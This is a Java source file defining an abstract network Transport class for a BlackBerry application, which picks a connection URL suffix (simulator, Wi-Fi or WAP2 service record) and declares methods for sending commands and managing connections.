//#preprocess
package blackberry.action.sync;

import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import blackberry.action.sync.transport.TransportException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

public abstract class Transport {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Transport", DebugLevel.VERBOSE);
    //#endif

    /*
     * public final static int WIFI = 0; public final static int GPRS = 1;
     * public final static int APN = 2; public final static int WAP2 = 3; public
     * final static int NUM = 4;
     */

    protected String host;
    protected int port;

    protected String url;
    protected String suffix;   

    public Transport(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public String toString() {
        return "Transport " + host + ":" + port;
    }

    public abstract boolean isAvailable();

    public abstract byte[] command(byte[] data) throws TransportException;

    public abstract boolean initConnection();

    public abstract void close();

    public String getFullUrl() {
        //#ifdef DBC
        Check.requires(url != null && url.length() > 0, "getUrl: empty url");
        //#endif
        return url+getSuffix();
    }
    
    /**
     * Curently not used.
     * 
     * @return
     */
    public String getSuffix() {

        if (DeviceInfo.isSimulator()) {
            suffix = ";deviceside=true";
        } else if ((WLANInfo.getWLANState() == WLANInfo.WLAN_STATE_CONNECTED)
                && RadioInfo.areWAFsSupported(RadioInfo.WAF_WLAN)) {
            suffix = ";interface=wifi";
        } else {
            String uid = null;
            final ServiceBook sb = ServiceBook.getSB();
            final ServiceRecord[] records = sb.findRecordsByCid("WPTCP");
            for (int i = 0; i < records.length; i++) {
                if (records[i].isValid() && !records[i].isDisabled()) {
                    if (records[i].getUid() != null
                            && records[i].getUid().length() != 0) {
                        if ((records[i].getCid().toLowerCase().indexOf("wptcp") != -1)
                                && (records[i].getUid().toLowerCase().indexOf(
                                        "wifi") == -1)
                                && (records[i].getUid().toLowerCase().indexOf(
                                        "mms") == -1)) {
                            uid = records[i].getUid();
                            break;
                        }
                    }
                }
            }
            if (uid != null) {
                // WAP2 Connection
                suffix = ";deviceside=true;ConnectionUID=" + uid;
            } else {
                suffix = ";deviceside=true";
            }
        }

        //#ifdef DEBUG
        debug.trace("updateConnectionSuffix: " + suffix);
        //#endif
        return suffix;
    };

}
